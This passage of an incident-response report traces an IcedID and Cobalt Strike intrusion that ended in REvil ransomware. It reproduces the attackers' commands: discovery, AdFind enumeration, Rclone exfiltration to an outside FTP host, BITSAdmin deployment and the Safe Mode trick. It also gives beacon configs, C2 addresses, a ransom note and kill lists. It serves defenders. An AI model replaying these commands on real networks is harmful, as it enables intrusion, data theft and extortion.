`wuauclt.exe` process executed several PowerShell functions for UAC bypasses including:\n\n- UAC-TokenMagic\n- Invoke-SluiBypass\n\n#### Defense Evasion\n\nAbout one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\n\n```image\nAlt: Cobalt Strike Servers\nDescription: The image is a flow diagram illustrating the connection between IcedID and Cobalt Strike. It depicts a command execution process using 'rundll32.exe' to run a specified file path, which leads to the creation of remote threads via 'Cmd.exe'. Various IP addresses and domain names are displayed, indicating the external servers contacted during the process. The diagram provides a clear visual representation of the malware's behavior and the specific commands executed, making it relevant to Cyber Threat Intelligence.\nTranscription: |\n  IcedID to Cobalt Strike\n  ----------------------------------------\n  rundll32.exe \"C:\\Users\\UserName\\AppData\\Local\\Temp\\skull-x64.dat\", update /i:\"DwarfWing\\license.dat\"\n      ├── Create Remote Thread Cmd.exe\n      │       └── 45.86.163.78:80\n      │               └── Explorer.exe\n      │                       ├── 45.86.163.78:443\n      │                       │       └── cloudmetric.online\n      │                       └── WUAUCLT.exe\n      └── Create Remote Thread Cmd.exe\n              └── 195.189.99.74:443\n                      └── smalleststores.com\n```\n\nProcess injection was used multiple times across the environment using Cobalt Strike Beacons.\n\n```image\nAlt: Process Injection\nDescription: The image displays a log entry related to a security alert about process injection. It includes specific details such as the rule name, timestamps, source and target process GUIDs, process IDs, and the associated images. This technical information indicates a potential security threat where one process is attempting to inject code into another, a common tactic used by malware.\nTranscription: |\n  \"CreateRemoteThread detected:\n  RuleName: technique_id=T1055, technique_name=Process Injection\n  UtcTime:\n  SourceProcessGuid: {4d5468e-bb44-604f-8219-000000000000}\n  SourceProcessId: 4208\n  SourceImage: C:\\Windows\\SysWOW64\\rundll32.exe\n  TargetProcessGuid: {4d5468e-4969-6047-1c00-000000000000}\n  TargetProcessId: 1412\n  TargetImage: C:\\Windows\\System32\\svchost.exe\n  NewThreadId: 3996\n  StartAddress: 0x00000000003D0003\n  StartModule: -\n  StartFunction: -\"\n```\n\nPrior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n\n```image\nAlt: GPO\nDescription: The image displays a detailed log of a process creation event related to the PowerShell technique within the MITRE ATT&CK framework. It includes various technical details such as RuleName, ProcessGuid, ProcessId, Image, and Description, indicating that the process is associated with Microsoft Management Console. Additional information includes command line parameters, parent process details, and hash values for integrity and verification. This log provides insights into the execution context and behavior of a potentially malicious process.\nTranscription: |\n  Process Create:\n    RuleName: technique id=T1059.001.technique_name=PowerShell\n    UtcTime:\n    ProcessGuid: {46d5468e-d592-604f-401a-000000000000}\n    ProcessId: 1572\n    Image: C:\\Windows\\System32\\mmc.exe\n    FileVersion:\n    Description: Microsoft Management Console\n    Product: Microsoft Windows® Operating System\n    Company: Microsoft Corporation\n    OriginalFileName: mmc.exe\n    CommandLine: \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\gpmc.msc\"\n    CurrentDirectory: C:\\Users\\\n    User:\n    LogonGuid:\n    LogonId:\n    TerminalSessionId: 3\n    IntegrityLevel: High\n    Hashes:\n      SHA1: 715ABDA53ECDAD6A136F56A41A97444F24CA3195, MD5: 0ED2577AA82A3B1C155843F23B7E377D2\n    ParentProcessGuid: {46d5468e-d526-604f-341a-000000000000}\n    ParentProcessId: 5268\n    ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n    ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n```\n\nThe GPO was named “new”.\n\n```image\nAlt: GPO Name\nDescription: The image displays a section of a Group Policy Object (GPO) configuration related to Windows Defender Antivirus. It shows the 'Computer Configuration (Enabled)' header, followed by 'Policies' and 'Administrative Templates.' Under 'Windows Components/Windows Defender Antivirus,' two policies are listed: 'Turn off routine remediation' and 'Turn off Windows Defender Antivirus,' both marked as 'Enabled.' This indicates that these settings were altered to disable essential security measures, likely in the context of a cyber threat scenario involving ransomware.\nTranscription: |\n  Computer Configuration (Enabled)\n  Policies\n    Administrative Templates\n      Policy definitions (ADMX files) retrieved from the local computer.\n        Windows Components/Windows Defender Antivirus\n          Policy                                 Setting\n          Turn off routine remediation           Enabled\n          Turn off Windows Defender Antivirus    Enabled\n```\n\n#### Credential Access\n\nCredentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n\n```image\nAlt: Credential Dump\nDescription: The image displays a detailed technical breakdown of two processes related to credential dumping, likely from a cybersecurity analysis of a ransomware incident. It includes information on the processes '2f092e6.exe' and 'lsass.exe,' showing attributes such as execution time, path, integrity level, access privileges, process ID, command line, and cryptographic hashes (SHA1 and SHA256) for 'lsass.exe.' The structure indicates a hierarchical representation of process relationships, providing insights into how the malware operates.\nTranscription: |\n  2f092e6.exe\n  - Process name: 2f092e6.exe\n  - Execution time: [REDACTED]\n  - Path: \\\\[REDACTED]\\ADMIN$\\2f092e6.exe\n  - Integrity level: System\n  - Access privileges (UAC): Default\n  - Process ID: 4836\n  - Command line: 2f092e6.exe\n  \n      rundll32.exe\n      └── wuauserv.exe\n          └── lsass.exe\n              - Process name: lsass.exe\n              - Execution time: [REDACTED]\n              - Path: C:\\Windows\\System32\\lsass.exe\n              - Integrity level: System\n              - Access privileges (UAC): Default\n              - Process ID: 592\n              - Command line: lsass.exe\n              - File name: lsass.exe\n              - Full path: C:\\Windows\\System32\\lsass.exe\n              - SHA1: 0fb26350106c9bdd196d4e7d01eb30\n              - SHA256: bbc83e4759d4b82bad31e371ad679a\n              - Signer: Unknown\n```\n\n#### Discovery\n\nInitial discovery by the IcedID malware occurred within minutes of execution:\n\n```\ncmd.exe /c chcp >&2\nWMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nipconfig.exe ipconfig /all\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet.exe net group \"Domain Admins\" /domain\n```\n\nA flurry of LDAP queries were seen coming from `wuauclt.exe` (Cobalt Strike) on the beachhead.\n\n```\n\"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n\"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n...\n```\n\nWe believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n\n```image\nAlt: BloodHound Results\nDescription: The image displays a detailed breakdown of the process 'wuauclt.exe', including various attributes such as execution time, path, integrity level, access privileges, process ID, command line, file name, full path, SHA1, SHA256 hashes, signer, and issuer. Additionally, it shows a created file named 'BloodHound.zip' with its own attributes, including file name, full path, SHA1, SHA256 hashes, and signer information. This information is crucial for understanding the context of the Sodinokibi (REvil) ransomware's discovery phase and its associated activities.\nTranscription: |\n  Process name: wuauclt.exe\n  Execution time: Mar [redacted]\n  Path: c:\\windows\\system32\\wuauclt.exe\n  Integrity level: Medium\n  Access privileges (UAC): Restricted\n  Process ID: 624\n  Command line: WUAUCLT.exe\n  File name: wuauclt.exe\n  Full path: c:\\windows\\system32\\wuauclt.exe\n  SHA1: 58680265bb320f64920f6ec03702dca63b7c2\n  SHA256: efa27c2ee5a31f1fe4a1d59023702560614aa55\n  Signer: Microsoft Windows\n  Issuer: Microsoft Windows Production PCA 2011\n  \n  created file:\n  202103[redacted]_BloodHound.zip\n  File name: 202103[redacted]_BloodHound.zip\n  Full path: C:\\Users\\Public\\202103[redacted]_BloodHound.zip\n  SHA1: 5464e073dd8af58fce96b870587666f6f4c1e\n  SHA256: 2f390719b83dc67b62db8291bdfb80839964\n  Signer: Unknown\n```\n\nOnce on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\n\nAdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n\n```image\nAlt: AdFind\nDescription: The image displays detailed information about the execution of the AdFind.exe process, including its command line arguments, file paths, and cryptographic hashes (SHA1 and SHA256). It shows the process tree with AdFind.exe as a child of cmd.exe and rundll32.exe, indicating the execution context. The image also includes details such as process ID, integrity level, and access privileges, which are relevant for understanding potential security incidents involving this tool.\nTranscription: |\n  AdFind.exe\n  - Process Name: AdFind.exe\n  - Execution time: [REDACTED]\n  - Path: c:\\users\\public\\adfind.exe\n  - Integrity level: System\n  - Access privileges (UAC): Standard\n  - Process ID: 1068\n  - Command line: adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  - File Name: AdFind.exe\n  - Full path: c:\\users\\public\\adfind.exe\n  - SHA1: 4f48fc0f9b47d0ad95d159201fe7e72fbc844\n  - SHA256: c92c158d7c37fea795114fa6491fe5f145ad2f\n  - Signer: Unknown\n  \n  some.csv\n  - File Name: some.csv\n  - Full path: C:\\Users\\Public\\some.csv\n  - SHA1: 1c6e6237597881509769443aa477e1f403\n  - SHA256: 47a71807771fa2c48147ca0f3440a02fdc\n  - Signer: Unknown\n```\n\n```\ncmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv\n```\n\n#### Lateral Movement\n\nFor lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n\n```image\nAlt: Cobalt Strike Lateral Movement\nDescription: The image is a diagram illustrating the lateral movement of Cobalt Strike within a network. It shows an 'Infected Workstation' connecting to an 'Exchange Server', which then links to 'Domain Controllers', 'Servers', and 'Workstations'. The connections are represented with arrows, indicating the pathways of lateral movement in a compromised environment. The diagram is clearly labeled, making it easy to understand the relationships and flow of potential threats.\nTranscription: |\n  Cobalt Strike Lateral Movement\n  - Infected Workstation\n    - Exchange Server\n      - Domain Controllers\n      - Servers\n      - Workstations\n```\n\nCobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n\n```image\nAlt: SMB Transfer\nDescription: The image displays a log entry related to a system event, specifically the creation of a file. It includes technical details such as the Process GUID, Process ID, image source (System), and the target filename 'C:\\Windows\\0ddb81e.exe'. This log entry is relevant to monitoring and analyzing potential malicious activity, likely in the context of ransomware deployment.\nTranscription: |\n  data.win.system.level\n  4\n  data.win.system.message\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {78E9F60F-D30F-6048-0100-000000000080}\n  ProcessId: 4\n  Image: System\n  TargetFilename: C:\\Windows\\0ddb81e.exe\n  CreationUtcTime:\n```\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a log entry from a Windows system indicating that a new service was installed. It includes details such as the service name ('@ddb81e'), the service file path ('\\ADMONS\\@ddb81e.exe'), the service type (user mode service), the service start type (demand start), and the service account (LocalSystem). This data is relevant for understanding potential malicious activities, particularly in the context of ransomware attacks like Sodinokibi (REvil), as it shows how threat actors may install services to maintain persistence.\nTranscription: |\n  data.win.system.level 4\n  data.win.system.message \"A service was installed in the system.\n  \n  Service Name: @ddb81e\n  Service File Name: \\\\ADMIN$\\@ddb81e.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\n```image\nAlt: PowerShell Execution\nDescription: The image displays a text output that appears to be a service installation log related to a ransomware attack. It includes a service name (39884d), service file path indicating the use of PowerShell with an encoded command, and details about the service type, start type, and service account. The content is highly technical and relevant to cyber threat intelligence, specifically illustrating how a malicious service may be set up within a compromised system.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: 398843\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD8ATgBlAHcAQQB1AG8AIAAgAEcAIAAgAFAuAG8AbgAIAEwAbgAIAEwAbg...\n```\n\nTo facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n\n#### Collection\n\nThe Rclone utility was used to collect information from file shares and to exfiltrate the data.\n\n```\nsvchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n```image\nAlt: Rclone\nDescription: The image is a screenshot of a command line interface displaying technical details about the Rclone utility. It includes information such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), description (Rsync for cloud storage), product name (Rclone), company URL (https://rclone.org), and the original filename (rclone.exe). Additionally, it shows the command line used for executing Rclone to copy files from a specified network share to an FTP location.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n#### Command and Control\n\nIcedID:\n\n- cikawemoret34.space\n- 206.189.10.247:80\n\n```\nnomovee.website\n161.35.109.168:443\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\n```\n\n**Certificate:**\n\n```\ne0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43\nNot Before: 2021/03/11 02:06:51\nNot After: 2022/03/11 02:06:51\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n- 45.86.163.78:443\n- cloudmetric.online\n- JA3: a0e9f5d64349fb13191bc781f81f42e1\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\nb9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3\nNot Before: 2021/02/27 06:45:42\nNot After: 2021/05/28 07:45:42\nIssuer Org: Let's Encrypt\nSubject Common: cloudmetric.online\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\",\n    \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\",\n    \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\",\n    \"time\": 1615840900656.6\n  },\n  \"x86\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\",\n    \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\",\n    \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\",\n    \"time\": 1615840895189\n  }\n}\n```\n\n- 195.189.99.74\n- smalleststores.com\n- JA3: 72a589da586844d7f0818ce684948eea\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\n14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df\nNot Before: 2021/03/11 11:02:43\nNot After: 2021/06/09 12:02:43\nIssuer Org: Let's Encrypt\nSubject Common: smalleststores.com\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x86\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"88365eb3d504f570f22d76f777ab2caf\",\n    \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\",\n    \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\",\n    \"time\": 1615846680369.8\n  },\n  \"x64\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\",\n    \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\",\n    \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\",\n    \"time\": 1615846684589\n  }\n}\n```\n\n#### Exfiltration\n\nData that was collected from the domain was exfiltrated to a remote server at:\n\n```\n45.147.160.5:443\n```\n\n```image\nAlt: Exfiltration\nDescription: The image displays a terminal output showing details about a specific executable process related to cloud storage synchronization. It lists various attributes such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), a description (Rsync for cloud storage), product name (Rclone), company website, original filename (rclone.exe), and the command line used to execute the process. This information is typically relevant to cybersecurity analysis, particularly in identifying potential malicious activity associated with the Sodinokibi (REvil) ransomware.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\\\c$\\path\" ftp://user:password@host/path/\n```\n\n```image\nAlt: Exfiltration\nDescription: The image shows a detailed technical analysis related to the Sodinokibi (REvil) ransomware, specifically focusing on the exfiltration process. It includes information about the 'svchost.exe' process, such as its execution time, file path, integrity level, access privileges, and process ID. The command line used for executing 'svchost.exe' is displayed, indicating that it involved a file transfer, likely for data exfiltration. Additionally, the image provides cryptographic hashes (SHA1 and SHA256) for the 'svchost.exe' file, along with the IP address (45.147.160.5) and port (443) to which the connection was established, categorizing it under TCP protocol.\nTranscription: |\n  svchost.exe\n    Process name: svchost.exe\n    Execution time: [REDACTED]\n    Path: c:\\windows\\svchost.exe\n    Integrity level: System\n    Access privileges (UAC): Standard\n    Process ID: 2364\n    Command line: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\[REDACTED]\\C$\\[REDACTED]\" ftp:1:/C/[REDACTED]\n    File name: svchost.exe\n    Full path: c:\\windows\\svchost.exe\n    SHA1: fcfcf1e45e8d5cdca0450b8dc90754b68e8e\n    SHA256: 538078ab6d80d7cf889af3e08f62c4e83358\n    Signer: Unknown\n  \n  successfully established connection with\n    IP address: 45.147.160.5\n    Port: 443\n    Protocol: Tcp\n```\n\n#### Impact\n\nFor the final actions, the threat actors dropped a ransomware executable on the domain controller in `C:\\Windows` and then used BITSAdmin to deploy the executable to remote systems.\n\n```\nC:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe\n```\n\nThe `-smode` flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.\n\n```image\nAlt: smode Execution\nDescription: The image is a flowchart illustrating the execution process of the Sodinokibi (REvil) ransomware in Safe Mode. It depicts the sequence of processes involved, starting from an RDP login and the parent processes like 'explorer.exe' and 'PowerShell.exe'. The flowchart also includes details of child processes such as 'Bitsadmin.exe' and 'DomainName.exe', highlighting the commands used to execute the ransomware and set system configurations. Additionally, it shows how registry values are manipulated to ensure the system reboots into Safe Mode with Networking and later exits it.\nTranscription: |\n  Sodinokibi (aka REvil) smode Execution\n  \n  RDP Login\n  Parent Process\n  C:\\Windows\\explorer.exe / NOUACCHECK\n      |\n      +-- Parent Process\n          PowerShell.exe\n              |\n              +-- Child Process\n                  Bitsadmin.exe\n                      |\n                      +-- Child Process\n                          DomainName.exe\n                              |\n                              +-- C:\\Windows\\DomainName.exe -smode\n                                  System auto reboots into Safe Mode with Networking within seconds of execution\n                              |\n                              +-- bcdeidt.exe\n                                  |\n                                  +-- Registry value set:\n                                      Key: HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                      Value name: *AstraZeneca\n                                      Value data: C:\\windows\\DomainName.exe\n                              |\n                              +-- Registry value set:\n                                  Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                  Value name: *franceisshit\n                                  Value data: bcdeidt /deletevalue {current} safeboot\n```\n\nThe `*franceisshit` key was used to boot the machine out of Safe Mode upon restarting the machine.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a log entry detailing an event related to a ransomware operation. It includes various elements such as the event type ('SetValue'), an image path indicating the location of the executed file, and a unique process ID. Additionally, it references a specific registry key associated with the ransomware's command execution, highlighting the technique used by the threat actors to manipulate system settings for their malicious intent. This information is relevant for understanding the actions and tactics employed by ransomware groups.\nTranscription: |\n  details       : bcdedit /deletevalue {current} safeboot\n  eventType     : SetValue\n  image         : C:\\Windows\\*.exe\n  processGuid   : {b093c253-dfa5-604f-3c07-000000000100}\n  processId     : 6512\n  ruleName      : technique_id=T1547.001, technique_name=Registry Run Keys / Start Folder\n  targetObject  : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit\n```\n\nThe systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\n\nWe’ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n\nAfter rebooting out of Safe Mode, you are left with the following desktop:\n\n```image\nAlt: Desktop\nDescription: The image is a screenshot of a ransom note displayed in a Notepad window. The note informs the victim that their files are encrypted and currently unavailable, providing instructions on how to recover them. It emphasizes the importance of following the instructions and warns that contacting the attackers is necessary to potentially restore the files. The note includes details on accessing a website via a TOR browser or VPN for further instructions, and it mentions the potential for private data to be published if contact is not made. The overall tone is threatening and demand-driven.\nTranscription: |\n  All of your files are encrypted!\n  Find _________-readme.txt and follow instructions\n  \n  ------ Welcome. Again. ------\n  [+] Whats Happen? [+]\n  Your files are encrypted, and currently unavailable. You can check it: all files on your system has extension ________.\n  By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\n  \n  ========Attention!!=========\n  Also your private data was downloaded. We will publish it in case you will not get in touch with us asap.\n  ===========================\n  \n  [+] What guarantees? [+]\n  Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will. To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.\n  If you will not cooperate with our service - for us, it does not matter. But you will lose your time and data, cause just we have the private key.\n  \n  [+] How to get access on website? [+]\n  You have two ways:\n  1) [Recommended] Using a TOR browser!\n     a) Download and install TOR browser from this site: https://torproject.org/\n     b) Open our website: http://___________:929\n  \n  2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:\n     a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)\n     b) Open our secondary website: http://___________\n  \n  Warning: secondary website can be blocked, thats why first variant much better and more available.\n  When you open our website, put the following data in the input form:\n  Key:\n```\n\nOn certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by `rundll32` to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n\n```\nC:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer\n```\n\n```image\nAlt: rundll32 Execution\nDescription: The image displays a detailed output of a command-line analysis related to the execution of the `rundll32.exe` process. It includes various metadata such as command line, company, current directory, file version, and hashes associated with the process. Additionally, it provides information on the integrity level, logon GUID, logon ID, original file name, and the parent command line and image, indicating that the `rundll32.exe` was executed to register a DLL file during a potential ransomware attack.\nTranscription: |\n  commandLine: 'C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\...\\DomainName.dll,DllRegisterServer'\n  company: Microsoft Corporation\n  currentDirectory: C:\\Users\\_________\\\n  description: Windows host process (Rundll32)\n  fileVersion: __________\n  hashes:\n    SHA1: F3BA3415D60A8871F285570BEA2E29874CBFF1, MD5: C73BA51880F5A7B20C84185A23212EF, SHA256: __________\n  image: C:\\Windows\\System32\\rundll32.exe\n  integrityLevel: High\n  logonGuid: {4ea529df-c91f-604f-3cb4-a70e00000000}\n  logonId: 0xea7b43c\n  originalFileName: RUNDLL32.EXE\n  parentCommandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n  parentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThe threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here’s a few screenshots from the website.\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed on a computer screen, indicating that the network has been infected by ransomware. It features a prominent red header stating 'Your network has been infected!' along with a brief explanation of the situation. The note assures victims that their files are encrypted and provides instructions on how to purchase a decryption tool, referred to as 'General-Decryptor,' along with a price mention for all PCs on the infected network. Additional sections prompt users to follow instructions, chat support, and details about decryption.\nTranscription: |\n  Your network has been infected!\n  \n  Your documents, photos, databases and other important files encrypted\n  \n  To decrypt your files you need to buy our special software - General-Decryptor\n  \n  Follow the instructions below. But remember that you do not have much time\n  \n  General-Decryptor price\n  the price is for all PCs of your infected network\n  \n  How to decrypt files?\n  You will not be able to decrypt the files yourself. If you try, you will lose your files forever.\n  \n  Buy XMR (no need for verification)\n  - LocalMonero\n```\n\nWith the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n\n```image\nAlt: Config\nDescription: The image displays a malware analysis report specifically for the Sodinokibi (REvil) ransomware. It includes general information such as the target file 'DomainName.exe', its size (120KB), and a sample identifier. The report features a score of 10/10, suggesting high severity. Additionally, it lists hashes (MD5, SHA1, SHA256, SHA512) corresponding to the malware, confirming its identity and integrity. The extracted malware configuration section outlines attributes like 'Family' as 'sodinokibi', a 'Botnet', and a 'Campaign ID' of 7114, indicating its operational context.\nTranscription: |\n  {\n    \"General\": {\n      \"Target\": \"DomainName.exe\",\n      \"Size\": \"120KB\",\n      \"Sample\": \"210321-rI7ygjf6sa\",\n      \"Score\": \"10/10\",\n      \"MD5\": \"af94dccb62f97700115a219c4b7626d22\",\n      \"SHA1\": \"bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\",\n      \"SHA256\": \"2896b38ec3ff196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\",\n      \"SHA512\": \"08c05fd98aba168734732d043c3e403f531522e0ec64484d15375f353aa23f9654852ad2c54a3e6b2a93\"\n    },\n    \"Malware Config\": {\n      \"Extracted\": {\n        \"Family\": \"sodinokibi\",\n        \"Botnet\": \"$2a$\",\n        \"Campaign\": \"7114\"\n      }\n    }\n  }\n```\n\n```\nCampaign ID (sub): 7114\nnet: false\n```\n\nList of processes to kill (prc):\n\n```\noracle\nklnagent\nmydesktopqos\ninfopath\nBackupExtender\npowerpnt\noutlook\nBackupAgent\nSmc\nsql\nccSvcHst\nBackupUpdater\nRtvscan\nwinword\nkavfsscs\nocssd\nisqlplussvc\nvisio\nShadowProtectSvc\ntbirdconfig\nTSSchBkpService\ndbeng50\nccSetMgr\nagntsvc\nSage.NA.AT_AU.SysTray\ndbsnmp\nthebat\nonenote\nAmitiAvSrv\nwordpad\nmsaccess\navgadmsv\nthunderbird\nBackupMaint\nMicrosoft.exchange.store.worker.exe\nCarboniteUI\nexcel\nSPBBCSvc\nLogmeInBackupService\nencsvc\nocomm\nsqbcoreservice\nNSCTOP\nmydesktopservice\nkavfs\nkavfswp\nocautoupds\nmspub\nxfssvccon\nDLOAdminSvcu\nsynctime\nlmibackupvssservice\nfirefox\nsteam\ndlomaintsvcu\n```\n\nList of services to kill:\n\n```\nTelemetryserver\n\"Sophos AutoUpdate Service\"\nsophos\nAltaro.Agent.exe\nmysqld\nMSSQL$MSGPMR\n\"SophosFIM\"\n\"Sophos Web Control Service\"\nSQLWriter\nsvcGenericHost\nAltiBack\n\"SQLServer Analysis Services (MSSQLSERVER)\"\nBackupExecAgentAccelerator\n\"StorageCraft ImageReady\"\nSQLTELEMETRY\nAzureADConnectAuthenticationAgent\nntrtscan\nds_notifier\nTeamViewer\n\"StorageCraft Raw Agent\"\n\"StorageCraft Shadow Copy 